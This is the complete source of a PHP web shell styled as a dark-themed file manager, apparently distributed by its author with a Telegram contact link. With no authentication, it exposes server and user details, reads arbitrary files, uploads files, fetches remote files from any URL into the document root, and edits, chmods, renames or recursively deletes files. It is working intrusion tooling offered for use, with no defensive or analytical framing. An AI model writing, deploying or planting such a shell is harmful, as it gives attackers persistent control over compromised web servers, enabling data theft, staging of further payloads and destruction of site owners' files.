<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GOOD SHELL SAMLONG</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'JetBrains Mono', monospace;
            background: #0d1117;
            color: #c9d1d9;
            line-height: 1.6;
            font-size: 14px;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
        }

        /* Header */
        .header {
            background: #161b22;
            border: 1px solid #21262d;
            border-radius: 6px;
            padding: 16px;
            margin-bottom: 16px;
        }

        .title {
            font-size: 18px;
            font-weight: 500;
            color: #58a6ff;
            margin-bottom: 12px;
        }

        .system-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 8px;
            font-size: 12px;
        }

        .info-line {
            padding: 4px 0;
        }

        .info-label {
            color: #7d8590;
            display: inline-block;
            width: 120px;
        }

        .info-value {
            color: #f0883e;
        }

        /* Breadcrumb */
        .breadcrumb {
            background: #0d1117;
            border: 1px solid #21262d;
            border-radius: 6px;
            padding: 12px;
            margin-bottom: 16px;
            font-size: 13px;
        }

        .breadcrumb a {
            color: #58a6ff;
            text-decoration: none;
        }

        .breadcrumb a:hover {
            text-decoration: underline;
        }

        /* Upload Section */
        .upload-section {
            background: #161b22;
            border: 1px solid #21262d;
            border-radius: 6px;
            padding: 16px;
            margin-bottom: 16px;
        }

        .section-title {
            font-size: 14px;
            font-weight: 500;
            color: #f0f6fc;
            margin-bottom: 12px;
        }

        .form-row {
            margin-bottom: 12px;
        }

        .radio-group {
            display: flex;
            gap: 20px;
            margin-bottom: 12px;
        }

        .radio-item {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 13px;
        }

        input[type="file"],
        input[type="text"],
        select,
        textarea {
            background: #0d1117;
            border: 1px solid #21262d;
            border-radius: 6px;
            color: #c9d1d9;
            padding: 8px 12px;
            font-family: inherit;
            font-size: 13px;
        }

        input[type="file"]:focus,
        input[type="text"]:focus,
        select:focus,
        textarea:focus {
            outline: none;
            border-color: #58a6ff;
        }

        .btn {
            background: #21262d;
            border: 1px solid #30363d;
            border-radius: 6px;
            color: #f0f6fc;
            padding: 6px 12px;
            font-family: inherit;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn:hover {
            background: #30363d;
            border-color: #8b949e;
        }

        .btn-primary {
            background: #238636;
            border-color: #238636;
        }

        .btn-primary:hover {
            background: #2ea043;
        }

        .btn-danger {
            background: #da3633;
            border-color: #da3633;
        }

        .btn-danger:hover {
            background: #f85149;
        }

        .upload-row {
            display: flex;
            gap: 8px;
            align-items: end;
        }

        .upload-row input[type="file"],
        .upload-row input[type="text"] {
            flex: 1;
        }

        .upload-row input[type="text"]:last-of-type {
            max-width: 150px;
        }

        /* Messages */
        .message {
            padding: 12px;
            border-radius: 6px;
            margin: 12px 0;
            font-size: 13px;
        }

        .message-success {
            background: rgba(35, 134, 54, 0.15);
            border: 1px solid #238636;
            color: #56d364;
        }

        .message-error {
            background: rgba(218, 54, 51, 0.15);
            border: 1px solid #da3633;
            color: #f85149;
        }

        /* Table */
        .file-table {
            background: #0d1117;
            border: 1px solid #21262d;
            border-radius: 6px;
            overflow: hidden;
            margin-bottom: 20px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th {
            background: #161b22;
            padding: 12px;
            text-align: left;
            font-weight: 500;
            font-size: 13px;
            color: #f0f6fc;
            border-bottom: 1px solid #21262d;
        }

        td {
            padding: 8px 12px;
            border-bottom: 1px solid #21262d;
            font-size: 13px;
        }

        tr:hover {
            background: #161b22;
        }

        .file-link {
            color: #c9d1d9;
            text-decoration: none;
        }

        .file-link:hover {
            color: #58a6ff;
        }

        .dir-link {
            color: #58a6ff;
        }

        .size {
            color: #7d8590;
            text-align: right;
        }

        .permissions {
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            color: #7d8590;
        }

        .writable { color: #56d364; }
        .readonly { color: #f85149; }

        /* Action Form */
        .action-form {
            display: flex;
            gap: 4px;
            align-items: center;
        }

        .action-form select {
            font-size: 12px;
            padding: 4px 8px;
            min-width: 80px;
        }

        .action-form .btn {
            padding: 4px 8px;
            font-size: 12px;
        }

        /* Edit Form */
        .edit-form {
            background: #161b22;
            border: 1px solid #21262d;
            border-radius: 6px;
            padding: 16px;
            margin: 16px 0;
        }

        .edit-form textarea {
            width: 100%;
            min-height: 400px;
            resize: vertical;
        }

        .edit-form .form-row {
            margin-top: 12px;
        }

        /* File Preview */
        .file-preview {
            background: #0d1117;
            border: 1px solid #21262d;
            border-radius: 6px;
            padding: 16px;
            margin: 16px 0;
        }

        .file-preview pre {
            background: #161b22;
            border: 1px solid #21262d;
            border-radius: 6px;
            padding: 16px;
            overflow-x: auto;
            font-size: 12px;
            line-height: 1.45;
        }

        /* Footer */
        .footer {
            text-align: center;
            margin-top: 40px;
            padding: 20px;
        }

        .telegram-link {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #0088cc;
            color: white;
            text-decoration: none;
            padding: 10px 20px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 500;
            transition: background 0.2s;
        }

        .telegram-link:hover {
            background: #0099dd;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container { padding: 10px; }
            .system-info { grid-template-columns: 1fr; }
            .upload-row { flex-direction: column; }
            .upload-row input[type="text"]:last-of-type { max-width: none; }
            table { font-size: 12px; }
            th, td { padding: 6px 8px; }
        }
    </style>
</head>
<body>
    <div class="container">

        <?php
        // === CONFIG & INITIALIZATION ===
        set_time_limit(0);
        error_reporting(0);
        foreach ($_POST as $key => $value) {
            $_POST[$key] = stripslashes($value);
        }

        $current_path = $_GET['path'] ?? getcwd();
        $current_path = str_replace('\\', '/', $current_path);
        $items = @scandir($current_path) ?: [];

        // === UTILITY FUNCTIONS ===
        function is_writable_dir($path) {
            return is_writable($path) ? "<span class='writable'>writable</span>" : "<span class='readonly'>readonly</span>";
        }

        function get_disabled_functions() {
            $disfunc = @ini_get("disable_functions");
            return empty($disfunc) ? "<span class='writable'>NONE</span>" : "<span class='readonly'>$disfunc</span>";
        }

        function format_size($bytes) {
            $size = $bytes / 1024;
            return $size >= 1024 ? round($size / 1024, 2) . 'M' : round($size, 3) . 'K';
        }

        function get_permissions($file) {
            $perms = fileperms($file);
            $info = '';

            // File type
            switch ($perms & 0xF000) {
                case 0xC000: $info = 's'; break; // Socket
                case 0xA000: $info = 'l'; break; // Symbolic Link
                case 0x8000: $info = '-'; break; // Regular
                case 0x6000: $info = 'b'; break; // Block
                case 0x4000: $info = 'd'; break; // Directory
                case 0x2000: $info = 'c'; break; // Character
                case 0x1000: $info = 'p'; break; // FIFO pipe
                default: $info = 'u';
            }

            // Owner
            $info .= ($perms & 0x0100) ? 'r' : '-';
            $info .= ($perms & 0x0080) ? 'w' : '-';
            $info .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');

            // Group
            $info .= ($perms & 0x0020) ? 'r' : '-';
            $info .= ($perms & 0x0010) ? 'w' : '-';
            $info .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');

            // World
            $info .= ($perms & 0x0004) ? 'r' : '-';
            $info .= ($perms & 0x0002) ? 'w' : '-';
            $info .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');

            return $info;
        }

        function delete_recursive($dir) {
            if (!file_exists($dir)) return;
            $items = scandir($dir);
            foreach ($items as $item) {
                if ($item == '.' || $item == '..') continue;
                $path = "$dir/$item";
                is_dir($path) ? delete_recursive($path) : @unlink($path);
            }
            @rmdir($dir);
        }

        function success($msg) { echo "<div class='message message-success'>$msg</div>"; }
        function error($msg) { echo "<div class='message message-error'>$msg</div>"; }

        function footer() {
            echo '<div class="footer">
                    <a href="https://t.me/itsmebrother1" class="telegram-link" target="_blank">
                        <span>@</span> <span>Telegram</span>
                    </a>
                  </div>';
        }

        // === HEADER ===
        ?>
        <div class="header">
            <div class="title">SHELL SAM CUY</div>
            <div class="system-info">
                <div class="info-line"><span class="info-label">Server:</span> <span class="info-value"><?= $_SERVER['SERVER_SOFTWARE'] ?></span></div>
                <div class="info-line"><span class="info-label">System:</span> <span class="info-value"><?= php_uname() ?></span></div>
                <div class="info-line"><span class="info-label">User:</span> <span class="info-value"><?= get_current_user() . " (" . getmyuid() . ")" ?></span></div>
                <div class="info-line"><span class="info-label">PHP:</span> <span class="info-value"><?= phpversion() ?></span></div>
                <div class="info-line" style="grid-column: 1 / -1;"><span class="info-label">Disabled:</span> <span class="info-value"><?= get_disabled_functions() ?></span></div>
            </div>
        </div>

        <!-- Breadcrumb -->
        <div class="breadcrumb">
            $ pwd: 
            <?php
            $paths = explode('/', $current_path);
            $cumulative = '';
            foreach ($paths as $i => $part) {
                if ($part === '') {
                    if ($i === 0) echo '<a href="?path=/">/</a>';
                    continue;
                }
                $cumulative .= "$part/";
                echo "<a href='?path=$cumulative'>$part</a>/";
            }
            ?>
        </div>

        <!-- Upload Section -->
        <div class="upload-section">
            <div class="section-title">Upload Files</div>

            <?php
            if (isset($_POST['upwkwk'])) {
                $upload_dir = ($_POST['dirnya'] == "2") ? $_SERVER['DOCUMENT_ROOT'] : $current_path;

                if (!empty($_FILES['berkas']['name'])) {
                    $target = "$upload_dir/{$_FILES['berkas']['name']}";
                    if (@move_uploaded_file($_FILES['berkas']['tmp_name'], $target)) {
                        success("File uploaded: $target");
                    } else {
                        error("Upload failed");
                    }
                } elseif (!empty($_POST['darilink']) && !empty($_POST['namalink'])) {
                    $target = "$upload_dir/{$_POST['namalink']}";
                    $data = @file_get_contents($_POST['darilink']);
                    if ($data !== false && @file_put_contents($target, $data)) {
                        success("File fetched: $target");
                    } else {
                        error("Fetch failed");
                    }
                } else {
                    error("Invalid input");
                }
            }
            ?>

            <form enctype="multipart/form-data" method="post">
                <input type="hidden" name="upwkwk" value="aplod">
                <div class="form-row">
                    <div class="radio-group">
                        <label class="radio-item">
                            <input type="radio" name="dirnya" value="1" checked> current [<?= is_writable_dir($current_path) ?>]
                        </label>
                        <label class="radio-item">
                            <input type="radio" name="dirnya" value="2"> docroot [<?= is_writable_dir($_SERVER['DOCUMENT_ROOT']) ?>]
                        </label>
                    </div>
                </div>

                <div class="form-row">
                    <div class="upload-row">
                        <input type="file" name="berkas">
                        <button type="submit" name="berkasnya" class="btn btn-primary">Upload</button>
                    </div>
                </div>

                <div class="form-row">
                    <div class="upload-row">
                        <input type="text" name="darilink" placeholder="https://example.com/file.txt">
                        <input type="text" name="namalink" placeholder="filename">
                        <button type="submit" name="linknya" class="btn btn-primary">Fetch</button>
                    </div>
                </div>
            </form>
        </div>

        <!-- File Actions -->
        <?php
        if (isset($_GET['fileloc'])) {
            $file = $_GET['fileloc'];
            echo "<div class='file-preview'>
                    <div class='section-title'>File: " . htmlspecialchars($file) . "</div>
                    <pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>
                  </div>";
            footer(); exit;
        }

        if (isset($_GET['pilihan'])) {
            $path = $_POST['path'] ?? '';
            $action = $_POST['pilih'] ?? '';

            if ($action === 'hapus') {
                if (is_dir($path)) {
                    delete_recursive($path);
                    file_exists($path) ? error("Delete failed") : success("Directory deleted");
                } else {
                    @unlink($path);
                    file_exists($path) ? error("Delete failed") : success("File deleted");
                }
            }

            if ($action === 'ubahmod' && isset($_POST['chm0d'])) {
                if (@chmod($path, octdec($_POST['perm']))) {
                    success("Permission changed");
                } else {
                    error("Permission change failed");
                }
            }

            if ($action === 'gantinama' && isset($_POST['gantin'])) {
                $new = $_POST['newname'];
                if (@rename($path, dirname($path) . '/' . $new)) {
                    success("Renamed successfully");
                } else {
                    error("Rename failed");
                }
            }

            if ($action === 'edit' && isset($_POST['gasedit'])) {
                if (@file_put_contents($path, $_POST['src']) !== false) {
                    success("File saved");
                } else {
                    error("Save failed");
                }
            }

            // Show forms
            if ($action === 'ubahmod') {
                echo "<div class='edit-form'>
                        <div class='section-title'>chmod " . htmlspecialchars($path) . "</div>
                        <form method='post'>
                            <div class='form-row'>
                                <input name='perm' type='text' size='4' value='" . substr(sprintf('%o', fileperms($path)), -4) . "' placeholder='0644'>
                                <input type='hidden' name='path' value='$path'>
                                <input type='hidden' name='pilih' value='ubahmod'>
                                <button type='submit' name='chm0d' class='btn btn-primary'>Apply</button>
                            </div>
                        </form>
                      </div>";
            }

            if ($action === 'gantinama') {
                $oldname = basename($path);
                echo "<div class='edit-form'>
                        <div class='section-title'>mv " . htmlspecialchars($path) . "</div>
                        <form method='post'>
                            <div class='form-row'>
                                <input name='newname' type='text' value='$oldname' placeholder='new name'>
                                <input type='hidden' name='path' value='$path'>
                                <input type='hidden' name='pilih' value='gantinama'>
                                <button type='submit' name='gantin' class='btn btn-primary'>Rename</button>
                            </div>
                        </form>
                      </div>";
            }

            if ($action === 'edit') {
                $content = htmlspecialchars(file_get_contents($path));
                echo "<div class='edit-form'>
                        <div class='section-title'>nano " . htmlspecialchars($path) . "</div>
                        <form method='post'>
                            <textarea name='src'>$content</textarea>
                            <div class='form-row'>
                                <input type='hidden' name='path' value='$path'>
                                <input type='hidden' name='pilih' value='edit'>
                                <button type='submit' name='gasedit' class='btn btn-primary'>Save</button>
                            </div>
                        </form>
                      </div>";
            }
        }
        ?>

        <!-- File Listing -->
        <div class="file-table">
            <table>
                <thead>
                    <tr>
                        <th>Name</th>
                        <th style="width: 80px;">Size</th>
                        <th style="width: 100px;">Permissions</th>
                        <th style="width: 120px;">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    // Directories
                    foreach ($items as $item) {
                        if ($item == '.' || $item == '..' || !is_dir("$current_path/$item")) continue;
                        $fullpath = "$current_path/$item";
                        $perm_class = is_writable($fullpath) ? 'writable' : (is_readable($fullpath) ? '' : 'readonly');
                        echo "<tr>
                                <td><a href='?path=$fullpath' class='file-link dir-link'>$item</a></td>
                                <td class='size'>--</td>
                                <td class='permissions $perm_class'>" . get_permissions($fullpath) . "</td>
                                <td>
                                    <form method='post' action='?pilihan&path=$current_path' class='action-form'>
                                        <select name='pilih'>
                                            <option value=''>--</option>
                                            <option value='hapus'>rm</option>
                                            <option value='ubahmod'>chmod</option>
                                            <option value='gantinama'>mv</option>
                                        </select>
                                        <input type='hidden' name='path' value='$fullpath'>
                                        <button type='submit' class='btn'>go</button>
                                    </form>
                                </td>
                              </tr>";
                    }

                    // Files
                    foreach ($items as $item) {
                        if (!is_file("$current_path/$item")) continue;
                        $fullpath = "$current_path/$item";
                        $size = format_size(filesize($fullpath));
                        $perm_class = is_writable($fullpath) ? 'writable' : (is_readable($fullpath) ? '' : 'readonly');
                        echo "<tr>
                                <td><a href='?fileloc=$fullpath&path=$current_path' class='file-link'>$item</a></td>
                                <td class='size'>$size</td>
                                <td class='permissions $perm_class'>" . get_permissions($fullpath) . "</td>
                                <td>
                                    <form method='post' action='?pilihan&path=$current_path' class='action-form'>
                                        <select name='pilih'>
                                            <option value=''>--</option>
                                            <option value='hapus'>rm</option>
                                            <option value='ubahmod'>chmod</option>
                                            <option value='gantinama'>mv</option>
                                            <option value='edit'>nano</option>
                                        </select>
                                        <input type='hidden' name='path' value='$fullpath'>
                                        <button type='submit' class='btn'>go</button>
                                    </form>
                                </td>
                              </tr>";
                    }
                    ?>
                </tbody>
            </table>
        </div>

        <?php footer(); ?>
    </div>
</body>
</html>
